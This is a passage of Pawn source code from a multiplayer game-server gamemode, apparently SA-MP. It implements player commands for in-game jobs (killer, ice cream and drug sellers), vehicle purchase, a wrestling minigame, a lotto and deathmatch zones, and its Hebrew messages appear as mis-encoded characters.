		if(!strlen(cmd)) return SendClientMessage(playerid,white," /getklevel [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(playerinfo[id][work] != work_killer) return SendClientMessage(playerid,red," .äùç÷ï äðáçø ìà øåöç");
		format(string,sizeof(string)," .äéà %d %s øîú äøåöç ùì",playerinfo[id][killerlevel],GetName(id));
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/allfreeze"))
	{
 		new Float:p[3];
		if(playerinfo[playerid][work] != work_killer) return SendClientMessage(playerid,red," .ìùéîåù áô÷åãä æå òìéê ìäéåú øåöç");
		if(playerinfo[playerid][killerlevel] < 32) return SendClientMessage(playerid,red," .ìùéîåù áô÷åãä æå òìéê ìäéåú ìôçåú áøîú øåöç 32");
		if(playerinfo[playerid][death][6]) return SendClientMessage(playerid,red," .úåëì ìáöò àú äô÷åãä äæå ø÷ ìàçø ùúîåú");
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && IsPlayerInCircle(i,p[0],p[1],10.000000) && i != playerid && playerinfo[i][work] != work_killer && GetPlayerSpecialAction(i) != SPECIAL_ACTION_HANDSUP && !IsPlayerInAnyVehicle(i)) SetPlayerSpecialAction(i,SPECIAL_ACTION_HANDSUP);
		OnPlayerText(playerid," Freeze all!");
		SendClientMessage(playerid,green," !æåäé äæãîðåúê ìáøåç");
		return 1;
	}
	if(equal(cmd,"/sicecream"))
	{
		SendClientMessage(playerid,lightblue," ~~~ :îåëøé âìéãä ~~~");
		SendClientMessage(playerid,pink," .òì ëì îåëø âìéãä ìñô÷ âìéãåú åáëê ìøôàåú ùç÷ðéí");
		SendClientMessage(playerid,pink," .òì ëì îëéøú âìéãä, îåëø äâìéãä éé÷áì àú ñëåí îçéø äâìéãä ùäåà äçìéè");
		SendClientMessage(playerid,pink," .ìùç÷ï ùééäøåâ îåëø âìéãä ééøãå 250$");
		SendClientMessage(playerid,pink," .îåëøé âìéãä ìà éëåìéí ìîëåø âìéãä àçã ìùðé");
		SendClientMessage(playerid,yellow," /besicecream :ëãé ìäéåú îåëø âìéãä éù ìä÷ìéã àú äô÷åãä");
		SendClientMessage(playerid,purple," :ô÷åãåú îåëøé âìéãä");
		SendClientMessage(playerid,yellow," /buyicecream(1) /icecreamcost(1)");
		return 1;
	}
	if(equal(cmd,"/besicecream"))
	{
		if(playerinfo[playerid][work] != work_none) return SendClientMessage(playerid,red," .àúä ëáø ðîöà áòáåãä ëìùäéú");
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 423) return SendClientMessage(playerid,red," .òìéê ìäéåú áàåèå âìéãä áëãé ìäéåú îåëø âìéãä");
		playerinfo[playerid][work] = work_icecream;
		playerinfo[playerid][icecreamcost] = 1;
		SendClientMessage(playerid,blue," /sicecream :ëòú àúä îåëø âìéãä. ìîéãò òì îåëøé äâìéãä");
		return 1;
	}
	if(equal(cmd,"/buyicecream"))
	{
		new seller = INVALID_PLAYER_ID, Float:h, string[M_S];
		if(playerinfo[playerid][work] == work_icecream) return SendClientMessage(playerid,red," .îåëøé âìéãä àéðí éëåìéí ì÷ðåú âìéãä");
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][work] == work_icecream && i != playerid && GetDistanceBetweenPlayers(playerid,i) < 8.000000)
			{
				seller = i;
				break;
			}
		}
		if(seller == INVALID_PLAYER_ID) return SendClientMessage(playerid,red," .àéï ùåí îåëø âìéãä ù÷øåá àìéê");
		if(GetMoney(playerid) < playerinfo[seller][icecreamcost]) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó");
		GiveMoney(playerid,0-playerinfo[seller][icecreamcost]);
		GiveMoney(seller,playerinfo[seller][icecreamcost]);
		GetPlayerHealth(playerid,h);
		if(h < 95.0) SetPlayerHealth2(playerid,h+5);
		else SetPlayerHealth2(playerid,100);
		SendClientMessage(playerid,green," !÷ðéú âìéãä");
		format(string,sizeof(string)," .%s ÷éáìú %d$ îäì÷åç",GetName(playerid),playerinfo[seller][icecreamcost]);
		SendClientMessage(seller,green,string);
		return 1;
	}
	if(equal(cmd,"/icecreamcost"))
	{
		new newcost, string[M_S];
		if(playerinfo[playerid][work] != work_icecream) return SendClientMessage(playerid,red," .òìéê ìäéåú îåëø âìéãä áëãé ìäùúîù áô÷åãä æå");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /icecreamcost [cost] :öåøú äùéîåù");
		newcost = strval(cmd);
		if(newcost < 1 || newcost > 100) return SendClientMessage(playerid,red," .îçéø ùâåé");
		playerinfo[playerid][icecreamcost] = newcost;
		format(string,sizeof(string)," .ùéðéú àú îçéø äâìéãä ì %d$",playerinfo[playerid][icecreamcost]);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/sdrugs"))
	{
		SendClientMessage(playerid,lightblue," ~~~ :ñåçøé ñîéí ~~~");
		SendClientMessage(playerid,pink," .òì ëì ñåçø ñîéí ìäúçî÷ îäîùèøä åìîëåø ñîéí");
		SendClientMessage(playerid,pink," .ñåçø äñîéí éëåì ì÷áåò àú îçéø äñîéí");
		SendClientMessage(playerid,yellow," /besdrugs :ëãé ìäéåú ñåçø ñîéí éù ìä÷ìéã àú äô÷åãä");
		SendClientMessage(playerid,purple," :ô÷åãåú ñîéí");
		SendClientMessage(playerid,yellow," /buydrugs(1) /usedrugs(1) /drugscost(1)");
		return 1;
	}
	if(equal(cmd,"/besdrugs"))
	{
		if(playerinfo[playerid][work] != work_none) return SendClientMessage(playerid,red," .àúä ëáø ðîöà áòáåãä ëìùäéú");
		playerinfo[playerid][work] = work_drugs;
		SendClientMessage(playerid,blue," /sdrugs :ëòú àúä ñåçø ñîéí. ìîéãò òì ñåçøé äñîéí äùúîù áô÷åãä");
		return 1;
	}
	if(equal(cmd,"/buydrugs"))
	{
		new seller = INVALID_PLAYER_ID, string[M_S];
		if(playerinfo[playerid][drugs] >= 3) return SendClientMessage(playerid,red," .ìà ðéúï ìäçæé÷ éåúø î3 ñîéí");
		if(playerinfo[playerid][work] == work_drugs) return SendClientMessage(playerid,red," .ñåçøé ñîéí àéðí éëåìéí ì÷ðåú ñîéí");
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][work] == work_drugs && i != playerid && GetDistanceBetweenPlayers(playerid,i) < 8.000000)
			{
				seller = i;
				break;
			}
		}
		if(seller == INVALID_PLAYER_ID) return SendClientMessage(playerid,red," .àéï ùåí ñåçø ñîéí ÷øåá àìéê");
		if(GetMoney(playerid) < playerinfo[seller][drugscost]) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó");
		GiveMoney(playerid,0-playerinfo[seller][drugscost]);
		GiveMoney(seller,playerinfo[seller][drugscost]);
		playerinfo[playerid][drugs]++;
		SendClientMessage(playerid,green," !÷ðéú ñîéí");
		if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"Drugs",playerinfo[playerid][drugs]);
		format(string,sizeof(string)," .%s ÷éáìú %d$ îäì÷åç",GetName(playerid),playerinfo[seller][drugscost]);
		SendClientMessage(seller,green,string);
		return 1;
	}
	if(equal(cmd,"/usedrugs"))
	{
		new Float:p[3];
		if(playerinfo[playerid][drugs] <= 0) return SendClientMessage(playerid,red," .àéï ìê ñîéí");
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		playerinfo[playerid][drugs]--, playerinfo[playerid][drugsp] = CreatePickupEx(1241,15,p[0],p[1],p[2]);
		SetTimerEx("DestroyPickup2",1000,0,"d",playerinfo[playerid][drugsp]);
		return 1;
	}
	if(equal(cmd,"/drugscost"))
	{
		new cost, string[M_S];
		if(playerinfo[playerid][work] != work_drugs) return SendClientMessage(playerid,red," .òìéê ìäéåú ñåçø ñîéí ìùéîåù áô÷åãä æå");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /drugscost [cost] :öåøú äùéîåù");
		cost = strval(cmd);
		if(cost < 1 || cost > 100) return SendClientMessage(playerid,red," .ñëåí ùâåé");
		playerinfo[playerid][drugscost] = cost;
		format(string,sizeof(string)," .ùéðéú àú îçéø äñîéí ùìê ì %d$",cost);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/exitwork"))
	{
		if(playerinfo[playerid][work] == work_none) return SendClientMessage(playerid,red," .àúä ìà ðîöà áùåí òáåãä");
		SendClientMessage(playerid,red," .äúôèøú îòáåãúê");
		playerinfo[playerid][work] = work_none, playerinfo[playerid][coplevel] = 0, playerinfo[playerid][doctorlevel] = 0, playerinfo[playerid][drivecost] = 0, playerinfo[playerid][killerlevel] = 0, playerinfo[playerid][icecreamcost] = 0;
		return 1;
	}
	if(equal(cmd,"/buyv"))
	{
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .òìéê ìäéåú øùåí åîçåáø ìùéîåù áô÷åãä æå");
		if(playerinfo[playerid][level] < 4) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 4");
		if(playerinfo[playerid][vehicle] != -1) return SendClientMessage(playerid,red," /sellv :ëáø éù ìê îëåðéú ù÷ðéú, ëãé ìîëåø àåúä øùåí àú äô÷åãä");
		if(!IsPlayerInAnyVehicle(playerid) || GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,red," .òìéê ìäéåú ðäâ áøëá ëãé ì÷ðåú àåúå");
		if(!vehicleinfo[GetPlayerVehicleID(playerid)][store]) return SendClientMessage(playerid,red," .äøëá ùáøùåúê ìà øëá ùì çðåú äîëåðéåú, àðà çôù àçø");
		new string[M_S];
		format(string,sizeof(string),"Vehicle%d",GetPlayerVehicleID(playerid));
		if(!equal(fgetstring(file_vstore,string),"None"))
		{
			format(string,sizeof(string)," .%s äøëá äæä ùééê ì",fgetstring(file_vstore,string));
			SendClientMessage(playerid,yellow,string);
			return 1;
		}
		if(GetMoney(playerid) < vehicleinfo[GetPlayerVehicleID(playerid)][storecost])
		{
			format(string,sizeof(string)," .àéï ìê îñôé÷ ëñó áëãé ì÷ðåú àú äøëá äæä, äåà òåìä %d$",vehicleinfo[GetPlayerVehicleID(playerid)][storecost]);
			SendClientMessage(playerid,red,string);
			return 1;
		}
		GiveMoney(playerid,0-vehicleinfo[GetPlayerVehicleID(playerid)][storecost]);
		playerinfo[playerid][vehicle] = GetPlayerVehicleID(playerid);
		if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"Vehicle",playerinfo[playerid][vehicle]);
		format(string,sizeof(string),"Vehicle%d",playerinfo[playerid][vehicle]);
		fsetstring(file_vstore,string,GetName(playerid));
		format(string,sizeof(string)," !%s ÷ðéú îçðåú äîëåðéåú àú äøëá",GetVehicleName(GetVehicleModel(GetPlayerVehicleID(playerid))));
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/callv"))
	{
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .òìéê ìäéåú øùåí åîçåáø ìùéîåù áô÷åãä æå");
		if(playerinfo[playerid][level] < 4) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 4");
		if(playerinfo[playerid][vehicle] == -1) return SendClientMessage(playerid,red," .àéï ìê øëá ù÷ðéú");
		if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .òìéê ìöàú îäøëá äðåëçé ùàúä ðîöà áå áëãé ìæîï àú äøëá ä÷ðåé ùìê");
		if(GetPlayerInterior(playerid) != 0 || GetPlayerVirtualWorld(playerid) != world_normal) return SendClientMessage(playerid,red," .ìà ðéúï ìùâø ìëàï àú äøëá");
		if(GetMoney(playerid) < 1000) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó, ùéâåø øëá òåìä 1000$");
		new Float:p[4];
		GiveMoney(playerid,0-1000);
		SendClientMessage(playerid,green," .øëáê ä÷ðåé ùåâø àìéê");
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(IsPlayerConnected(i) && IsPlayerInVehicle(i,playerinfo[playerid][vehicle]))
			{
				RemovePlayerFromVehicle(i);
				SendClientMessage(i,red," !áòì äøëá æéîï àú îëåðéúå");
			}
		}
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		GetPlayerFacingAngle(playerid,p[3]);
		SetVehiclePos(playerinfo[playerid][vehicle],p[0],p[1],p[2]);
		SetVehicleZAngle(playerinfo[playerid][vehicle],p[3]);
		SetTimerEx("PutInVehicle",1500,0,"iii",playerid,playerinfo[playerid][vehicle],0);
		return 1;
	}
	if(equal(cmd,"/sellv"))
	{
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .òìéê ìäéåú øùåí åîçåáø ìùéîåù áô÷åãä æå");
		if(playerinfo[playerid][level] < 4) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 4");
		if(playerinfo[playerid][vehicle] == -1) return SendClientMessage(playerid,red," .àéï ìê øëá ù÷ðéú");
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú áøëá ëãé ìîëåø àåúå");
		if(!vehicleinfo[GetPlayerVehicleID(playerid)][store]) return SendClientMessage(playerid,red," .äîëåðéú ùáøùåúê ìà îëåðéú ùì çðåú äîëåðéåú, àðà çôù àçøú");
		new string[M_S];
		format(string,sizeof(string),"Vehicle%d",GetPlayerVehicleID(playerid));
		if(!equal(fgetstring(file_vstore,string),GetName(playerid))) return SendClientMessage(playerid,yellow," .äøëá äæä ìà ùééê ìê");
		GiveMoney(playerid,vehicleinfo[GetPlayerVehicleID(playerid)][storecost]);
		format(string,sizeof(string)," .ùìê, äøååçú îîðä %d$ %s îëøú àú ä",vehicleinfo[GetPlayerVehicleID(playerid)][storecost],GetVehicleName(GetVehicleModel(playerinfo[playerid][vehicle])));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string),"Vehicle%d",playerinfo[playerid][vehicle]);
		fsetstring(file_vstore,string,"None");
		playerinfo[playerid][vehicle] = -1;
		if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"Vehicle",playerinfo[playerid][vehicle]);
		return 1;
	}
	if(equal(cmd,"/ccbuyv"))
	{
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .òìéê ìäéåú øùåí åîçåáø ìùéîåù áô÷åãä æå");
		if(playerinfo[playerid][level] < 4) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 4");
		if(!playerinfo[playerid][ccard]) return SendClientMessage(playerid,red," .àéï ìê ëøèéñ àùøàé");
		if(playerinfo[playerid][vehicle] != -1) return SendClientMessage(playerid,red," /sellv :ëáø éù ìê îëåðéú ù÷ðéú, ëãé ìîëåø àåúä øùåí àú äô÷åãä");
		if(!IsPlayerInAnyVehicle(playerid) || GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,red," .òìéê ìäéåú ðäâ áøëá ëãé ì÷ðåú àåúå");
		if(!vehicleinfo[GetPlayerVehicleID(playerid)][store]) return SendClientMessage(playerid,red," .äîëåðéú ùáøùåúê ìà îëåðéú ùì çðåú äîëåðéåú, àðà çôù àçøú");
		new string[M_S];
		format(string,sizeof(string),"Vehicle%d",GetPlayerVehicleID(playerid));
		if(!equal(fgetstring(file_vstore,string),"None"))
		{
			format(string,sizeof(string)," .%s äøëá äæä ùééê ì",fgetstring(file_vstore,string));
			SendClientMessage(playerid,yellow,string);
			return 1;
		}
		if(playerinfo[playerid][bank] < vehicleinfo[GetPlayerVehicleID(playerid)][storecost])
		{
			format(string,sizeof(string)," .àéï ìê îñôé÷ ëñó áëãé ì÷ðåú àú äøëá äæä, äåà òåìä %d$",vehicleinfo[GetPlayerVehicleID(playerid)][storecost]);
			SendClientMessage(playerid,red,string);
			return 1;
		}
		playerinfo[playerid][bank] -= vehicleinfo[GetPlayerVehicleID(playerid)][storecost];
		playerinfo[playerid][vehicle] = GetPlayerVehicleID(playerid);
		if(playerinfo[playerid][logged])
		{
			fsetint(fuser(playerid),"BankCash",playerinfo[playerid][bank]);
			fsetint(fuser(playerid),"Vehicle",playerinfo[playerid][vehicle]);
		}
		format(string,sizeof(string),"Vehicle%d",playerinfo[playerid][vehicle]);
		fsetstring(file_vstore,string,GetName(playerid));
		format(string,sizeof(string)," !áëøèéñ àùøàé %s ÷ðéú îçðåú äîëåðéåú àú äøëá",GetVehicleName(GetVehicleModel(GetPlayerVehicleID(playerid))));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," áàîöòåú ëøèéñ àùøàé %s ÷ðéú àú äøëá",GetVehicleName(GetVehicleModel(GetPlayerVehicleID(playerid))));
		BankLog(GetName(playerid),string,vehicleinfo[GetPlayerVehicleID(playerid)][storecost]);
		return 1;
	}
	if(equal(cmd,"/wwe"))
	{
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /wwe [action] :öåøú äùéîåù");
			SendClientMessage(playerid,white," /wwe state :äðåëçéú WWE îöá úçøåú ä");
			SendClientMessage(playerid,white," /wwe join :WWE äöèøôåú ì");
			SendClientMessage(playerid,white," /wwe quit :WWE ôøéùä îä");
			if(IsPlayerMAdmin(playerid))
			{
				SendClientMessage(playerid,white," /wwe start [place] :çãùä WWE äúçìú úçøåú");
				SendClientMessage(playerid,white," /wwe end [reason] :äðåëçéú WWE ñéåí úçøåú ä");
			}
			SendClientMessage(playerid,white," /wwe viewer [0(off)/1/2] :WWE äöèøôåú ëöåôä ì");
			return 1;
		}
		if(equal(cmd,"state"))
		{
			if(wweinfo[0])
			{
				if(wweinfo[2] > 1)
				{
					format(string,sizeof(string)," .ä÷øá éúçéì áòåã ,WWE éù ëòú %d ùðéåú",wweinfo[2]);
					SendClientMessage(playerid,green,string);
				}
				else SendClientMessage(playerid,green," .åä÷øá ëáø äúçéì WWE éù ëòú");
			}
			else SendClientMessage(playerid,red," .WWE àéï ëòú");
		}
		else if(equal(cmd,"join"))
		{
			if(!wweinfo[0]) return SendClientMessage(playerid,red," .ëøâò WWE àéï");
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ìà ðéúï ìäöèøó ìôòéìåú ëàùø àúä ááçéøú äãîåéåú");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäöèøó ìôòéìåú ëàùø àúä áîöá");
			if(playerinfo[playerid][waitwwe]) return SendClientMessage(playerid,red," .ä÷øá ùìê éúçéì áòåã ëîä ùðéåú, àðà äîúï áñáìðåú");
			if(playerinfo[playerid][inwwe]) return SendClientMessage(playerid,red," .WWE àúä ëáø á");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .àúä ëáø áôòéìåú");
			if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäöèøó ìôòéìåú ëàùø àúä áàéæåø ãé-àí");
			if(wweinfo[1] >= 2) return SendClientMessage(playerid,red," /wwe viewer :úôåñéí. àúä éëåì ìäùúúó ëöåôä WWE ùðééí îäî÷åîåú á");
			if(wweinfo[2] <= 1) return SendClientMessage(playerid,red," .æîï ääöèøôåú òáø");
			if(GetMoney(playerid) < 150) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó, äîçéø ìäöèøôåú ìôòéìåú äæå äåà 150$");
			if(playerinfo[playerid][viewerwwe]) return SendClientMessage(playerid,red," .àéðê éëåì ìäùúúó ëàùø àúä öåôä");
			SendClientMessage(playerid,green," .áäöìçä, àðà äîúï ìúçéìú ä÷øá ùìê WWE äöèøôú ì");
			GiveMoney(playerid,0-150);
			playerinfo[playerid][waitwwe] = 1;
			playerinfo[playerid][wweid] = wweinfo[1];
			wweinfo[1]++;
			wwejoins[wweinfo[1]? 0:1] = playerid;
			SendClientMessage(playerid,lightblue," ~~~ :WWE äöèøôú ìúçøåú ä ~~~");
			SendClientMessage(playerid,yellow,"  îèøúê äéà ìäúàâøó òí äéøéá ùìê åìäùàø äàçøåï äçéé òì äæéøä");
			format(string,sizeof(string),"  äéðê îúçøä îñôø #%d",wweinfo[1]);
			SendClientMessage(playerid,pink,string);
			SendClientMessage(playerid,purple," » !áäöìçä, åîùç÷ îäðä");
		}
		else if(equal(cmd,"quit"))
		{
			if(!wweinfo[0]) return SendClientMessage(playerid,red," .ëøâò WWE àéï");
			if(!playerinfo[playerid][inwwe]) return SendClientMessage(playerid,red," .WWE àúä ìà á");
			SendClientMessage(playerid,green," .WWE ôøùú îä");
			playerinfo[playerid][waitwwe] = 0, playerinfo[playerid][inwwe] = 0, playerinfo[playerid][wweid] = 0;
			wweinfo[1]--;
			SpawnPlayer(playerid);
			SetPlayerVirtualWorld(playerid,world_normal);
			SetFreeze(playerid,0);
			SetPlayerInterior(playerid,0);
			playerinfo[playerid][inact] = 0;
			for(new i=0;i<2;i++) wwejoins[i] = INVALID_PLAYER_ID;
			PlayerPlaySound(playerid,1069,0.0,0.0,0.0);
			if(wweinfo[1] == 1)
			{
				for(new i=0;i<MAX_PLAYERS;i++)
				{
					if(IsPlayerConnected(i))
					{
						if(playerinfo[i][inwwe])
						{
							format(string,sizeof(string),"~r~%s ~n~~w~is the winner in the ~b~wwe~w~!",GetName(i));
							MovingText(string,mt_activity);
							format(string,sizeof(string)," !WWE ðéöç áúçøåú ä %s",GetName(i));
							SendClientMessageToAll(yellow,string);
							SetPlayerInterior(i,0);
							SpawnPlayer(i);
							GiveMoney(i,10000);
							playerinfo[i][inwwe] = 0, playerinfo[i][waitwwe] = 0, playerinfo[i][wweid] = 0;
							playerinfo[i][inact] = 0;
							wweinfo[0] = 0, wweinfo[1] = 0, wweinfo[2] = 0;
							KillTimer(wweinfo[3]);
							PlayerPlaySound(i,1069,0.0,0.0,0.0);
						}
						else if(playerinfo[i][viewerwwe])
						{
							playerinfo[i][viewerwwe] = 0;
							TogglePlayerSpectating(i,0);
							SendClientMessage(i,yellow," !î÷ååéí ùðäðú ìöôåú");
							PlayerPlaySound(i,1069,0.0,0.0,0.0);
						}
					}
				}
			}
		}
		else if(equal(cmd,"start"))
		{
			#if trainings == false
				if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú àãîéï áëãé ìäùúîù áôòåìä æå");
			#endif
			if(wweinfo[0]) return SendClientMessage(playerid,red," .WWE ëáø éù");
			if(ThereIsAct()) return SendClientMessage(playerid,red," .ëáø éù ôòéìåú ôåòìú");
			cmd = strtok(cmdtext,idx), wweinfo[4] = !strlen(cmd) ? random(3) : strval(cmd);
			if(wweinfo[4] < 0) wweinfo[4] = 0;
			if(wweinfo[4] > 2) wweinfo[4] = 2;
			StartWWE();
		}
		else if(equal(cmd,"end"))
		{
			new reason[256];
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú àãîéï áëãé ìäùúîù áôòåìä æå");
			if(!wweinfo[0]) return SendClientMessage(playerid,red," .ëøâò WWE àéï");
			reason = strrest(cmdtext,idx);
			if(!strlen(reason)) reason = " àéï";
			EndWWE(reason,playerid);
		}
		else if(equal(cmd,"viewer"))
		{
			if(!wweinfo[0]) return SendClientMessage(playerid,red," .ëøâò WWE àéï");
			if(playerinfo[playerid][waitwwe]) return SendClientMessage(playerid,red," .WWE àéðê éëåì ìäéåú öåôä ëàùø àúä äåìê ì÷øá ä");
			if(playerinfo[playerid][modeafk] ||
			playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .àéðê éëåì ìäéåú öåôä áîöáê äðåëçé");
			if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäöèøó ìôòéìåú ëàùø àúä áàéæåø ãé-àí");
			if(wweinfo[2] > 1) return SendClientMessage(playerid,red," .ä÷øá òåã ìà äúçéì");
			if(GetMoney(playerid) < 150) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó, äîçéø ìäöèøôåú ìôòéìåú äæå äåà 150$");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd))
			{
				SendClientMessage(playerid,white," /wwe viewer [number] :öåøú äùéîåù");
				SendClientMessage(playerid,white," /wwe viewer 0 :äôñ÷ú äöôééä");
				SendClientMessage(playerid,white," /wwe viewer [1/2] :WWE öôééä áàçã îîùúúôé ä");
			}
			new pnum = strval(cmd);
			if(pnum < 0 || pnum > 2) return SendClientMessage(playerid,red," .îñôø ùç÷ï ùâåé");
			if(!pnum)
			{
				if(!playerinfo[playerid][viewerwwe]) return SendClientMessage(playerid,red," .àúä ìà öåôä á÷øá");
				playerinfo[playerid][inact] = 0;
				SetPlayerVirtualWorld(playerid,0);
				TogglePlayerSpectating(playerid,0);
				SpawnPlayer(playerid);
				playerinfo[playerid][viewerwwe] = 0;
			}
			else
			{
				playerinfo[playerid][inact] = 1;
				SetPlayerVirtualWorld(playerid,world_wwe);
				TogglePlayerSpectating(playerid,1);
				PlayerSpectatePlayer(playerid,wwejoins[pnum-1]);
				playerinfo[playerid][viewerwwe] = 1;
				SendClientMessage(playerid,lightblue," ~~~ :áúåø öåôä WWE äöèøôú ìúçøåú ä ~~~");
				SendClientMessage(playerid,yellow,"  îúàâøôéí WWE úåëì ìöôåú áùç÷ðéí äîúçøéí á");
				SendClientMessage(playerid,orange,"  /wwe viewer 0 :ìäôñ÷ú äöôééä");
				SendClientMessage(playerid,orange,"  /wwe viewer 1 :öôééä áîúçøä îñôø #1");
				SendClientMessage(playerid,orange,"  /wwe viewer 2 :öôééä áîúçøä îñôø #2");
				SendClientMessage(playerid,purple," » !áäöìçä, åöôééä îäðä");
			}
		}
		else SendClientMessage(playerid,red," .ùâåéä WWE àôùøåú");
		return 1;
	}
	if(equal(cmd,"/lotto"))
	{
		if(lottonum[0] == -1) return SendClientMessage(playerid,red," .àéï äâøìú ìåèå ëòú");
		if(playerinfo[playerid][plotto] != -1) return SendClientMessage(playerid,red," .ðéúï ìùìåç ìåèå ôòí àçú áäâøìä àçú áìáã");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /lotto [1-50] :öåøú äùéîåù");
		new num = strval(cmd);
		if(num < 1 || num > 50) return SendClientMessage(playerid,red," .äîñôø öøéê ìäéåú áéï 1 ì 50");
		playerinfo[playerid][plotto] = num;
		if(num == lottonum[0] && lottonum[1] == -1) lottonum[1] = playerid;
		SendClientMessage(playerid,green," .äîñôø ðùìç ìäâøìä, àðà äîúï òì îðú ìøàåú àí æëéú");
		return 1;
	}
	if(equal(cmd,"/startlotto") && IsPlayerMAdmin(playerid))
	{
		if(lottonum[0] != -1 || (maths[0] != -1 && maths[1] != -1 && maths[2] != -1) || trivia[0] != -1 || strlen(replytest) > 0) return SendClientMessage(playerid,red," .ëáø éù ôòéìåú îùðéú ôåòìú");
		Lotto();
		return 1;
	}
	if(equal(cmd,"/sm"))
	{
		if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .àúä ëáø ðîöà áàéæåø ãé-àí ëìùäå");
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .àéðê éëåì ìäöèøó ìàéæåø ãé-àí ëàùø àúä ááçéøú äãîåéåú");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäöèøó ìàéæåø ãé-àí ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäöèøó ìàéæåø ãé-àí ëàùø àúä áôòéìåú");
		if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò ô÷åãä æå áîðåó");
		SetPlayerVirtualWorld(playerid,world_dm_sm);
		playerinfo[playerid][dmzone] = dmz_sm;
		ResetWeapons(playerid);
		GiveWeapon(playerid,34,100000);
		if(IsPlayerInAnyVehicle(GetPlayerVehicleID(playerid))) SetVehicleToRespawn(GetPlayerVehicleID(playerid));
		new rnd = random(sizeof(DMZ_RandomSpawns_MMnS));
		SetPlayerPos(playerid,DMZ_RandomSpawns_MMnS[rnd][0],DMZ_RandomSpawns_MMnS[rnd][1],DMZ_RandomSpawns_MMnS[rnd][2]);
		SetPlayerFacingAngle(playerid,DMZ_RandomSpawns_MMnS[rnd][3]);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,0);
		#if usingYSF
			//SetPlayerGravity(playerid,0.001000);
		#endif
		SendClientMessage(playerid,green," !Sniper Madness áøåê äáà ìàéæåø äãé-àí");
		return 1;
	}
	if(equal(cmd,"/mm"))
	{
		if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .àúä ëáø ðîöà áàéæåø ãé-àí ëìùäå");
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .àéðê éëåì ìäöèøó ìàéæåø ãé-àí ëàùø àúä ááçéøú äãîåéåú");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäöèøó ìàéæåø ãé-àí ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäöèøó ìàéæåø ãé-àí ëàùø àúä áôòéìåú");
		if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò ô÷åãä æå áîðåó");
